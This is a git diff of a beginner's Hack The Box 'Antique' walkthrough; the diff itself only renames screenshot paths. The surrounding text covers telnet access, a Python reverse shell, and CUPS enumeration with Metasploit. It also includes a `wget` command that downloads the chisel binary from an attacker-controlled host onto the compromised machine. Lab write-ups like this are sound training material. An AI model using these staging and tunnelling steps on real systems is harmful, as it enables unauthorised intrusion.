@@ -8,11 +8,11 @@ I am a beginner at penetration testing, so I will be referencing the Official Ha
 
 From the tags, I am able to notice that this machine is about printer exploitation on Linux:
 
-![](<../../.gitbook/assets/image (341) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (341) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 A basic nmap scan shows that only telnet is online:
 
-![](<../../.gitbook/assets/image (331) (1) (1).png>)
+![](<../../.gitbook/assets/image (331) (1) (1) (1).png>)
 
 Trying to telnet into the system, it asks for a password:
 
@@ -92,7 +92,7 @@ I noticed the write-up use python for the reverse shell. I then used [https://gi
 
 ![](<../../.gitbook/assets/image (349) (1) (1) (1) (1) (1).png>)
 
-![](<../../.gitbook/assets/image (350) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (350) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 I viewed the walk-through again to see what I missed. The walk-through author runs the netstat command to see what connections are there:
 
@@ -100,11 +100,11 @@ I viewed the walk-through again to see what I missed. The walk-through author ru
 
 They then go on to say that we should use **chisel** to connect to the port. I ran into an issue here where I was unable to download a GitHub repository onto the machine itself. I then realize that you make the binary locally and then upload it to the server. I uploaded the file to the machine by running `python3 -m http.server` on the folder where chisel was downloaded. I was then able to upload it by running `wget http://10.10.14.10:8000/chisel` on the remote machine. When I uploaded the file, I was unable to run it due to some dependency error in terms of version of libc:
 
-![](<../../.gitbook/assets/image (351) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (351) (1) (1) (1) (1) (1) (1) (1).png>)
 
 &#x20;I then followed [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/) to see what I missed and what I could have done instead. They run `wget localhost:631`, which makes a file called **index.html** in the folder you are in. There, you can see that CUPS is mentioned:
 
-![](<../../.gitbook/assets/image (339) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (339) (1) (1) (1) (1) (1) (1) (1).png>)
 
 When we search for cups on metasploit we get the following:
 
